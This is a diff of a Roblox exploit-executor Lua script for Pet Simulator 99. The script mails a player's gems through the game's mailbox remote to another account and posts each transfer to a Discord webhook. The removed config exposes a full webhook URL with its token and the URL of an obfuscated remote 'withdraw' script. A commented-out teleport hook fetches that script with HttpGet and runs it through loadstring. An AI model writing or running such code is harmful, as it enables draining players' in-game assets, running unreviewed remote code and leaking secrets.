@@ -1,12 +1,3 @@
-getgenv().config = {
-    sending_message = "hello there",
-    webhook = "https://discord.com/api/webhooks/1312836336540975247/3ngL7IMr5ARbV2nd-pABYaxt5HkNG1szNlJ0TZ4Ww2dzGrz9YIv9GUhXoQPhx6X0vNs2",
-    gui = false,
-    src = "https://raw.githubusercontent.com/TheCoolCruiser/auto-gems-lua/refs/heads/main/withdraw-obfuscated.lua"
-}
-
-
--- delete above when done testing --
 function main()
     repeat task.wait() until game:IsLoaded()
     task.wait(30)
@@ -27,6 +18,9 @@ function main()
         game_name = "PS99"
     end
 
+    local network = nil
+
+    if game_name == "PS99" then network = require(game:GetService("ReplicatedStorage").Library.Client.Network) end
 
     local function claim_event()
         game:GetService("ReplicatedStorage").Network["Mailbox: Claim All"]:InvokeServer()
@@ -122,7 +116,13 @@ function main()
             [4] = get_diamond_id(),
             [5] = gems_amount
         }
-        local i,v = game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+        local i,v 
+        if game_name == "PS99" then 
+            i,v = network.Invoke("Mailbox: Send", unpack(args))
+        else
+            i,v = game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+        end
+
         print("Mailbox log: ", i,v)
         if i then
             send_webhook(playerName, gems_amount)
@@ -330,11 +330,11 @@ function main()
     
     local serializedConfig = serializeTable(getgenv().config)
 
-    queue_on_teleport([[
-        repeat task.wait() until game:IsLoaded()
-        getgenv().config = ]] .. serializedConfig .. [[
-        print("New config: ", getgenv().config)
-        loadstring(game:HttpGet(getgenv().config.src))()
-    ]])
+    -- queue_on_teleport([[
+    --     repeat task.wait() until game:IsLoaded()
+    --     getgenv().config = ]] .. serializedConfig .. [[
+    --     print("New config: ", getgenv().config)
+    --     loadstring(game:HttpGet(getgenv().config.src))()
+    -- ]])
 end
 main()
